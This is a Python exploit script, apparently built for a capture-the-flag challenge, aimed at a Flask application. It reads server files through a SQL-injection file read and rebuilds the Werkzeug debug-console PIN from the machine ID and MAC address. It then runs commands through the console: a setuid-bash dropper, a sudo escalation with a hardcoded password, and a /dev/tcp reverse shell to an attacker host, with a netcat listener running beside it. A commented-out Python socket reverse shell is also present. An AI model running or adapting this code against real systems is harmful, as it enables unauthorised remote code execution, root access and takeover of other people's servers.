#!/usr/bin/env python
import requests
import argparse
import time
import sys
import re
import os
import subprocess
import hashlib
from itertools import chain
from termcolor import colored
from urllib.parse import quote
import base64
import threading


staticFile={
    # Static-File Paths Don't change these, unless required
    'interface':'/etc/network/interfaces',  # getting list of interfaces available on the server
    'machine-id':'/etc/machine-id'          # get_machine_id(), /etc/machine-id
}

class DebugConsole:
    def __init__(self,address=None,port=None,secret=None,payload=None,headers=None):
        self.address = address
        self.port = port
        self.secret = secret
        self.headers = headers
        self.payload = payload
        
class MachineInstance:
    def __init__(self, username, modname, className, absolutePath, privateBits_uuid, privateBits_machineid):
        self.username = username
        self.modname = modname
        self.className = className
        self.absolutePath = absolutePath
        self.privateBits_uuid = privateBits_uuid
        self.privateBits_machineid = privateBits_machineid.rstrip('\n')

# Function to listen on the same terminal
def listen(lport):
    os.system(f"nc -lnp {lport}")
    

def stylePrint(s):
    for c in s:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.01)

def print_setting(setting_name, value):
    tick_mark = colored("[âœ”]", 'green')
    statement = colored(f"{setting_name}", 'white')
    machine_value = colored(value, 'yellow')
    stylePrint(f"{tick_mark} {statement}\t: {machine_value}\n")
    time.sleep(0.2)
    
def isAlive(ip_address):
    try:
        # Use the 'ping' command to check if the IP address is reachable
        subprocess.check_output(['ping', '-c', '1', ip_address])
        return True
    except subprocess.CalledProcessError:
        return False

## This function fetches the required file, you may change it as per your requirements
## Since this program can be used against any vulnerable server, all you need to do is
## make changes to the getFile() function and reverseShell() fuction
def getFile(address, port, file):
    injection = f"download?id='%20UNION%20SELECT%20'file://{file}'%20--%20-"
    payload = f"http://{address}:{port}/{injection}"
    response = requests.get(payload, allow_redirects=True, stream=True)
    try:
        if response.status_code == 200:
            content = response.text
            return content
        else:
            print(f"Failed to fetch {file}. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error Occured! : {e}")

def getMACUUID(address,port,networkInterface):
    filePath=f"/sys/class/net/{networkInterface}/address"
    getMAC=getFile(address,port,filePath)
    address=getMAC.replace(':','').replace('-','')
    integer=int(address,16)
    return integer

def getUsername(filePath):
    path_components = filePath.split('/')
    username=os.path.basename(os.path.dirname(filePath))
    home_index = path_components.index('home') if 'home' in path_components else -1
    username = path_components[home_index + 1] if home_index != -1 and home_index + 1 < len(path_components) else None
    return username

def getAppName(filePath):
    app_name = os.path.basename(os.path.dirname(filePath))
    return f"{app_name}.app"

def getErrorResponse(address,port):
    payload = f"http://{address}:{port}/download?id=0"
    response=requests.get(payload)
    pattern = r'File "(.*?)"'
    matches = re.findall(pattern, response.text)
    paths=sorted(set(matches))
    filePath=''
    if paths:
        for path in paths:
            filePath=path
    return filePath

def getPin(machineData):
    probably_public_bits = [
        machineData.username,
        machineData.modname,
        machineData.className,
        machineData.absolutePath
    ]

    private_bits = [
        machineData.privateBits_uuid,
        machineData.privateBits_machineid
    ]
    print_setting("Setting Username", machineInstance.username)
    print_setting("Setting Modname", machineInstance.modname)
    print_setting("Setting App Path", machineInstance.absolutePath)
    print_setting("Setting App Class", machineInstance.className)
    print_setting("Setting UUID", machineInstance.privateBits_uuid)
    print_setting("Setting MAC UUID", machineInstance.privateBits_machineid)
    
    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if not isinstance(bit, bytes):
            bit = str(bit).encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')
    num = None
    if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]

    rv =None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                            for x in range(0, len(num), group_size))
                break
        else:
            rv = num

    return rv

def print_dangerous(message):
    dangerous_icon = colored("[âœ”] ðŸ’€", 'red')  # You can customize the icon
    decorated_message = f"{dangerous_icon} {colored(message, 'red')}"
    print(decorated_message)

def sendRequest(debugConsole):
    address=debugConsole.address
    port=debugConsole.port
    secretValue=debugConsole.secret
    headers=debugConsole.headers
    payload=debugConsole.payload
    
    # URL Encode the payload before sending
    encodedExploit=quote(payload)
    payload=f"http://{address}:{port}/console?&__debugger__=yes&cmd={encodedExploit}&frm=0&s={secretValue}"
    requests.get(payload,headers=headers)
    
def reverseShell(address,port,pin,LHOST,LPORT):
    try:
        stylePrint("\n")
        print_setting("Checking Auth!",f"http://{address}:{port}/console")
        initRequest=requests.get(f"http://{address}:{port}/console")
        pattern = re.compile(r'SECRET\s*=\s*"(.*?)"')
        match = re.findall(pattern, initRequest.text)
        secretValue = match[0]
        authPin=f"http://{address}:{port}/console?__debugger__=yes&cmd=pinauth&pin={pin}&s={secretValue}"
        if secretValue:
            try:
                response=requests.get(authPin)
                semicolonIndex = response.headers['Set-Cookie'].find(';')
                cookie = response.headers['Set-Cookie'][:semicolonIndex]
                headers = {
                    "Cookie":f"{cookie}"
                }
                print_setting("Auth Success!",f"{cookie}\n")
                stylePrint(colored("[âœ”] ðŸ“¡ Started listening for the connection!\n", 'cyan'))
                debugConsole=DebugConsole(
                address=address,
                port=port,
                secret=secretValue,
                headers=headers,
                )
                # Original Exploit just to get to mcskidy
                # exploit=f"""import socket,subprocess,os,time;time.sleep(2);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")"""
                # encodedExploit=quote(exploit)
                # payload=f"http://{address}:{port}/console?&__debugger__=yes&cmd={encodedExploit}&frm=0&s={secretValue}"
                # print_dangerous("Executing Reverse Shell")
                # requests.get(payload,headers=headers)
                # stylePrint(colored("ðŸ‘‹ Bye!", 'blue'))
                # sys.exit(0)

                ## Updated Code here
                ## Get a root shell directly                
                createFile="echo IyEvYmluL2Jhc2gKY2htb2QgK3MgL2Jpbi9iYXNo|base64 -d > ~/["
                changePermission="chmod +x ~/["
                exploitRoot="echo F453TgvhALjZ | sudo -S /usr/bin/bash /opt/check.sh"
                revshell=f"/bin/bash -p -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"
                        
                print_dangerous("Executing Reverse Shell")
                payloads=[createFile,changePermission,exploitRoot,revshell]
                for exploit in payloads:
                    encodeExploit=base64.b64encode(exploit.encode('utf-8')).decode('utf-8')
                    payload=f"import subprocess; command = ['/bin/bash', '-c', 'echo {encodeExploit}|base64 -d|/bin/bash']; subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)"
                    debugConsole.payload=payload
                    sendRequest(debugConsole)
                    time.sleep(1)
                
                stylePrint(colored("ðŸ‘‹ Bye!\n", 'blue'))
                sys.exit(0)
                
            except Exception as e:
                failure_icon = colored("[âœ˜]", 'red')
                print(f"{failure_icon} {colored('Authentication Faliure', 'red')}")
                print(f"{failure_icon} {colored('Restart the target', 'red')}")
                print(colored("ðŸ‘‹ Bye!", 'blue'))
                sys.exit(0)
                

    except Exception as e:
        print("Error :",e)

def generateConsolePin(machineInstance):
    pin = getPin(machineInstance)
    if pin:
        success_icon = colored("[âœ”]", 'green')
        stylePrint(f"{success_icon} Console PIN\t\t: {colored(pin, 'green')}")
    else:
        failure_icon = colored("[âœ˜]", 'red')
        print(f"{failure_icon} {colored('Failed to Generate Console Pin', 'red')}")
    return pin


if __name__ == "__main__":
    try:
        parser = argparse.ArgumentParser(description="Exploit LFI via SQLI, a simple SSRF exploit")
        parser.add_argument("--address", "-a", dest="address", required=True, help="Server IP Address")
        parser.add_argument("--port", "-p", dest="port", required=True, help="Server Port")
        parser.add_argument("--lhost", "-lh", dest="lhost", required=True, help="Attacker Host IP")
        parser.add_argument("--lport", "-lp", dest="lport", required=True, help="Attacker Listener Port")
        args=parser.parse_args()
        address=args.address
        port=args.port
        lhost=args.lhost
        lport=args.lport
        if isAlive(address):
            try:            
                interfaceData=getFile(address,port,staticFile['interface'])
                interfacePattern = re.compile(r'\bauto\s+(\w+)\b')
                matches=interfacePattern.findall(interfaceData)
                interfaceCount=len(matches)
            except Exception:
                failure_icon = colored("[âœ˜]", 'red')
                print(f"{failure_icon} {colored('SSRF Exploit Faliure', 'red')}")
                print(colored("ðŸ‘‹ Bye!", 'blue'))
                sys.exit(0)
                
            if matches:
                print("\n")
                print_setting("ðŸ“‚ SSRF Exploited!\t", f"{address}")
                counter = 0
                for interface in matches:
                    counter += 1
                    stylePrint(f"[{colored(counter, 'cyan')}] : {colored(interface, 'cyan')}\n")
                choice = input(colored('[âœ”] Choose Server Interface\t: ', 'yellow'))
            try:
                choice=int(choice)
                if choice > 0 and choice <= interfaceCount:
                    networkInterface=matches[choice-1]
                    stylePrint(colored("\n[âœ”] ðŸ§¬ Generating Console Pin\n", 'blue'))
                    machineInstance=MachineInstance(
                        username=getUsername(getErrorResponse(address,port)),
                        modname=getAppName(getErrorResponse(address,port)),
                        absolutePath=getErrorResponse(address,port),
                        className="Flask", # Default most of the time
                        privateBits_uuid=getMACUUID(address,port,networkInterface),
                        privateBits_machineid=getFile(address,port,staticFile['machine-id'])
                    )
                    pin=generateConsolePin(machineInstance)
                    execRevshell = threading.Thread(target=reverseShell, args=(address,port,pin,lhost,lport,))
                    listenRevshell = threading.Thread(target=listen, args=(lport,)) # Creating 2 threads, one for listening, one for executing the reverse shell.
                    listenRevshell.start()
                    execRevshell.start()
            except TypeError as e:
                print(f"Error : {e}")
        else:
            print(f"{address} is not reachable.")
            print(colored("ðŸ‘‹ Bye!", 'blue'))
            sys.exit(0)

    except Exception as e:
        print(f"Error Occured! : {e}")
    except KeyboardInterrupt:
        print("\n")
        print(colored("ðŸ‘‹ Bye!", 'blue'))
        sys.exit(0)
        
